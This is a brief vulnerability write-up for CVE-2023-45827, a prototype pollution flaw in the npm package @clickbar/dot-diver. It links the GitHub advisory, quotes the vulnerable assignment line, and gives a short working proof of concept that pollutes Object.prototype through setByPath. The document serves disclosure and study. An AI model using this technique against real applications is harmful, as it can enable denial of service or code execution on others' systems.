# CVE-2023-45827



## 취약점 개요

- CVE-2023-45827

- CVSS : 9.8

- Nov 3, 2023

- ProtoType Pollution in node.js package

- rebob 프로젝트의 일환

## 취약점 설명

[github advisories](https://github.com/clickbar/dot-diver/security/advisories/GHSA-9w5f-mw3p-pj47)

This is a Prototype Pollution(PP) vulnerability in dot-diver. It can leads to RCE.


**vulnerable code**

```
//https://github.com/clickbar/dot-diver/tree/main/src/index.ts:277
//eslint-disable-next-line @typescript-eslint/no-unsafe-member-access
objectToSet[lastKey] = value
```
**poc**

```
import { getByPath, setByPath } from '@clickbar/dot-diver'

console.log({}.polluted); // undefined
setByPath({},'constructor.prototype.polluted', 'foo');
console.log({}.polluted); // foo
```

It is Prototype Pollution(PP) and it can leads to Dos, RCE, etc.


[target package](https://www.npmjs.com/package/@clickbar/dot-diver)